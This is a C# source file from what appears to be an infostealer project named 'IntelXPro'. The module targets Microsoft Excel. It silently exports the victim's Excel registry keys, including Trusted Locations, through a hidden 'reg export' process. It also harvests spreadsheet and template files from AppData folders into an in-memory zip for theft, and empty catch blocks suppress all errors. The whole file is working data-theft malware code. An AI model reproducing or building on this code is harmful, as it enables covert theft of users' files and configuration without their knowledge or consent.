using IntelXPro.src.IntelXPro.Dependencies.Data;
using IntelXPro.src.IntelXPro.Stealer;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Microsoft
{
    internal class Excel : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            try
            {
                var excelApp = new Counter.CounterApplications { Name = "Microsoft Excel" };
                
                CollectExcelRegistry(zip, excelApp);
                CollectExcelFiles(zip, excelApp);
                
                if (excelApp.Files.Count > 0)
                {
                    counter.Applications.Add(excelApp);
                }
            }
            catch { }
        }

        private void CollectExcelRegistry(InMemoryZip zip, Counter.CounterApplications excelApp)
        {
            try
            {
                string[] registryPaths = {
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel",
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Options",
                    @"HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations"
                };

                foreach (string regPath in registryPaths)
                {
                    try
                    {
                        string fileName = $"excel_registry_{regPath.Split('\\').Last()}.reg";
                        using (var process = new Process())
                        {
                            process.StartInfo.FileName = "reg";
                            process.StartInfo.Arguments = $"export \"{regPath}\" \"{fileName}\" /y";
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                            process.WaitForExit();

                            if (File.Exists(fileName))
                            {
                                string relativePath = Path.Combine("Microsoft", "Excel", fileName);
                                zip.AddFile(relativePath, File.ReadAllBytes(fileName));
                                excelApp.Files.Add(relativePath);
                                File.Delete(fileName);
                            }
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }

        private void CollectExcelFiles(InMemoryZip zip, Counter.CounterApplications excelApp)
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                
                string[] excelPaths = {
                    Path.Combine(appData, "Microsoft", "Templates"),
                    Path.Combine(appData, "Microsoft", "Excel", "XLSTART")
                };

                foreach (string excelPath in excelPaths)
                {
                    if (Directory.Exists(excelPath))
                    {
                        CollectExcelFilesFromPath(excelPath, zip, excelApp);
                    }
                }
            }
            catch { }
        }

        private void CollectExcelFilesFromPath(string basePath, InMemoryZip zip, Counter.CounterApplications excelApp)
        {
            try
            {
                foreach (string file in Directory.GetFiles(basePath, "*", SearchOption.AllDirectories))
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file).ToLower();
                        
                        if (extension == ".xlsx" || extension == ".xls" || extension == ".xlsm" || 
                            extension == ".xltx" || extension == ".xlt" || extension == ".xltm" ||
                            extension == ".xlam" || extension == ".xla" || extension == ".xlsb" ||
                            fileName.Contains("excel") || fileName.Contains("template"))
                        {
                            string relativePath = Path.Combine("Microsoft", "Excel", 
                                file.Substring(basePath.Length).TrimStart('\\'));
                            
                            zip.AddFile(relativePath, File.ReadAllBytes(file));
                            excelApp.Files.Add(relativePath);
                        }
                    }
                    catch { }
                }
            }
            catch { }
        }
    }
}
